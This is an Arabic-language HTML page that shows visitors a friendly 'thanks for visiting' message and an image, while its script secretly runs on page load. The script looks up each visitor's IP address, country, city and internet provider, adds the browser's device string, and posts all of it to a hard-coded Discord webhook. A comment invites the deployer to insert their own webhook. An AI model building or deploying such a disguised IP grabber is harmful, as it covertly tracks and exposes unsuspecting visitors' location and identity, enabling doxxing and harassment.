<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شكراً لك</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #1a1a1a;
            margin: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .container {
            text-align: center;
            color: white;
            background: #2a2a2a;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        h1 { margin-bottom: 20px; }
        img {
            max-width: 300px;
            border-radius: 15px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.5);
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>شكراً لدخولك موقعنا!</h1>
        <p>نتمنى لك يوماً سعيداً.</p>
        <!-- يمكنك تغيير رابط الصورة أدناه بصورة تخصك -->
        <img src="https://i.imgur.com/8Qe6q4w.jpeg" alt="شكراً">
    </div>

    <script>
        async function logVisitor() {
            try {
                // جلب معلومات الـ IP
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                // جمع معلومات الجهاز
                const deviceInfo = navigator.userAgent;

                // تجهيز الرسالة
                const message = `
**🚨 زائر جديد دخل الموقع!**
**🌐 الـ IP:** ${data.ip}
**📍 الدولة:** ${data.country_name}
**🏙️ المدينة:** ${data.city}
**📡 مزود الخدمة:** ${data.org}
**📱 الجهاز:** ${deviceInfo}
                `;

                // 👇 ضع رابط الـ Webhook الجديد الخاص بك هنا بدلاً من القديم 👇
                const webhookUrl = 'https://discord.com/api/webhooks/1569295450123669574/ubEoLtdHrdEkguldJ8TDTyoX_8El7kZbpqZhOze58gSbcv8qlrA1Tfxklw05BN8g3rNP';

                // إرسال البيانات إلى ديسكورد
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: message })
                });

            } catch (error) {
                console.log("حدث خطأ في جلب البيانات:", error);
            }
        }

        // تشغيل الدالة فور فتح الصفحة
        logVisitor();
    </script>
</body>
</html>
